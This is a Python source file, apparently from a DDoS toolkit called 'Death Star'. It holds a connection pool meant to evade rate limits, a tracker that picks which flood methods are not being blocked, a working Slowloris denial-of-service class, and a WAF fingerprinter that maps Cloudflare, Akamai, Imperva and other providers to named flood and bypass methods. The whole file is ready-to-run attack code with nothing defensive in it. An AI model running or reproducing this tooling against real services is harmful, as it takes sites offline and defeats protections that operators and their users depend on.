"""Death Star modules: KeepalivePool, ResponseSwapper, SlowlorisFlood, WAFFingerprint."""

from __future__ import annotations
import socket
import ssl
import time
import threading
import random
from collections import defaultdict, deque
from contextlib import suppress
from typing import Optional, Callable, List, Dict


# --- 1. KeepalivePool ---
class KeepalivePool:
    """Reuse TCP/TLS connections to bypass per-connection rate limits."""

    def __init__(self, max_per_host: int = 32, ttl: float = 30.0):
        self.max_per_host = max_per_host
        self.ttl = ttl
        self._pools: Dict[tuple, deque] = defaultdict(deque)
        self._lock = threading.Lock()
        self._ssl_ctx = None

    def _get_ssl_ctx(self):
        if self._ssl_ctx is None:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with suppress(Exception):
                ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
            self._ssl_ctx = ctx
        return self._ssl_ctx

    def acquire(
        self, host: str, port: int, use_ssl: bool = False, server_hostname: str = None
    ):
        key = (host, port, use_ssl)
        with self._lock:
            pool = self._pools[key]
            while pool:
                sock, ts = pool.popleft()
                if time.time() - ts < self.ttl:
                    return sock
                with suppress(Exception):
                    sock.close()
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw.settimeout(8)
            raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            raw.connect((host, port))
            if use_ssl:
                raw = self._get_ssl_ctx().wrap_socket(
                    raw, server_hostname=server_hostname or host
                )
            return raw
        except Exception:
            return None

    def release(self, host: str, port: int, sock, use_ssl: bool = False):
        if sock is None:
            return
        key = (host, port, use_ssl)
        with self._lock:
            pool = self._pools[key]
            if len(pool) < self.max_per_host:
                pool.append((sock, time.time()))
            else:
                with suppress(Exception):
                    sock.close()

    def discard(self, sock):
        with suppress(Exception):
            sock.close()

    def close_all(self):
        with self._lock:
            for pool in self._pools.values():
                while pool:
                    sock, _ = pool.popleft()
                    with suppress(Exception):
                        sock.close()
            self._pools.clear()


GLOBAL_POOL: Optional[KeepalivePool] = None


def get_global_pool() -> KeepalivePool:
    global GLOBAL_POOL
    if GLOBAL_POOL is None:
        GLOBAL_POOL = KeepalivePool(max_per_host=32, ttl=30.0)
    return GLOBAL_POOL


# --- 2. ResponseSwapper ---
class ResponseSwapper:
    """Track per-method block rates and suggest method swaps."""

    def __init__(
        self,
        methods: List[str],
        window_seconds: float = 5.0,
        block_threshold: float = 0.6,
        min_samples: int = 20,
    ):
        self.methods = list(methods)
        self.window = window_seconds
        self.block_threshold = block_threshold
        self.min_samples = min_samples
        self._history: Dict[str, deque] = {m: deque(maxlen=500) for m in methods}
        self._lock = threading.Lock()
        self._blocked: set = set()

    def report(self, method: str, status_code: int):
        if method not in self._history:
            with self._lock:
                self._history[method] = deque(maxlen=500)
        self._history[method].append((time.time(), status_code))

    def _is_blocked_code(self, code: int) -> bool:
        return code in (403, 406, 419, 429, 444, 503, 521, 522, 523)

    def evaluate(self) -> Dict[str, dict]:
        now = time.time()
        out = {}
        with self._lock:
            for m, hist in self._history.items():
                recent = [(t, c) for (t, c) in hist if now - t <= self.window]
                if len(recent) < self.min_samples:
                    out[m] = {
                        "block_rate": 0.0,
                        "samples": len(recent),
                        "blocked": False,
                    }
                    continue
                blocks = sum(1 for _, c in recent if self._is_blocked_code(c))
                rate = blocks / len(recent)
                blocked = rate >= self.block_threshold
                if blocked:
                    self._blocked.add(m)
                else:
                    self._blocked.discard(m)
                out[m] = {
                    "block_rate": rate,
                    "samples": len(recent),
                    "blocked": blocked,
                }
        return out

    def healthy_methods(self) -> List[str]:
        stats = self.evaluate()
        return [m for m, s in stats.items() if not s["blocked"]]


# --- 3. SlowlorisFlood ---
class SlowlorisFlood:
    """Slowloris DoS: open many sockets, send partial HTTP headers, keep alive."""

    def __init__(
        self,
        host: str,
        port: int,
        sockets: int = 500,
        use_ssl: bool = False,
        log_callback: Callable = None,
    ):
        self.host = host
        self.port = port
        self.target_sockets = sockets
        self.use_ssl = use_ssl
        self.log = log_callback or (lambda *a, **k: None)
        self._stop = threading.Event()
        self._socks: List = []
        self._lock = threading.Lock()
        self._ssl_ctx = None

    def _make_ssl_ctx(self):
        if self._ssl_ctx is None:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            self._ssl_ctx = ctx
        return self._ssl_ctx

    def _open_one(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((self.host, self.port))
            if self.use_ssl:
                s = self._make_ssl_ctx().wrap_socket(s, server_hostname=self.host)
            ua = random.choice(
                [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/115.0",
                ]
            )
            req = (
                f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept-language: en-US,en,q=0.5\r\n"
            ).encode()
            s.send(req)
            return s
        except Exception:
            return None

    def _keep_alive_loop(self):
        while not self._stop.is_set():
            with self._lock:
                socks_snapshot = list(self._socks)
            for s in socks_snapshot:
                if self._stop.is_set():
                    break
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                except Exception:
                    with self._lock:
                        with suppress(Exception):
                            self._socks.remove(s)
                    with suppress(Exception):
                        s.close()
            with self._lock:
                missing = self.target_sockets - len(self._socks)
            for _ in range(min(missing, 50)):
                if self._stop.is_set():
                    break
                s = self._open_one()
                if s:
                    with self._lock:
                        self._socks.append(s)
            self._stop.wait(15)

    def start(self):
        self.log(
            f"[SLOWLORIS] Opening {self.target_sockets} sockets to {self.host}:{self.port}"
        )
        threads = []

        def opener():
            for _ in range(self.target_sockets // 20):
                if self._stop.is_set():
                    return
                s = self._open_one()
                if s:
                    with self._lock:
                        self._socks.append(s)

        for _ in range(20):
            t = threading.Thread(target=opener, daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join(timeout=30)
        self.log(f"[SLOWLORIS] Established {len(self._socks)} stuck sockets")
        self._ka_thread = threading.Thread(target=self._keep_alive_loop, daemon=True)
        self._ka_thread.start()

    def stop(self):
        self._stop.set()
        with self._lock:
            for s in self._socks:
                with suppress(Exception):
                    s.close()
            self._socks.clear()


# --- 4. WAFFingerprint ---
class WAFFingerprint:
    """Detect WAF from response headers and suggest bypass methods."""

    BYPASS_MAP = {
        "Cloudflare": [
            "BYPASS",
            "CFB",
            "CFBUAM",
            "TLS_FLOOD",
            "H2_RST",
            "RAPID",
            "STEALTH",
        ],
        "Akamai": ["STEALTH", "RAPID", "TLS_FLOOD", "MIX", "BOT", "DYN"],
        "Sucuri": ["BYPASS", "STEALTH", "WORDPRESS", "MIX"],
        "Imperva": ["STEALTH", "MIX", "DYN", "EVEN", "BYPASS"],
        "DDoS-Guard": ["DGB", "BYPASS", "STEALTH", "TLS_FLOOD"],
        "AWS CloudFront": ["RAPID", "TLS_FLOOD", "H2_RST", "STEALTH"],
        "Unknown / None": ["RAPID", "BYPASS", "TLS_FLOOD", "H2_RST", "STEALTH"],
    }

    @staticmethod
    def detect_from_headers(headers: dict) -> str:
        h = {k.lower(): str(v) for k, v in headers.items()}
        if "cf-ray" in h or "cf-cache-status" in h:
            return "Cloudflare"
        if "x-sucuri-id" in h:
            return "Sucuri"
        if "x-akamai-transformed" in h or "x-akamai-request-id" in h:
            return "Akamai"
        if "x-iinfo" in h or ("x-cdn" in h and "imperva" in h.get("x-cdn", "").lower()):
            return "Imperva"
        if "ddos-guard" in h.get("server", "").lower() or "x-ddg-project" in h:
            return "DDoS-Guard"
        if "x-amz-cf-id" in h or "x-amzn-requestid" in h:
            return "AWS CloudFront"
        return "Unknown / None"
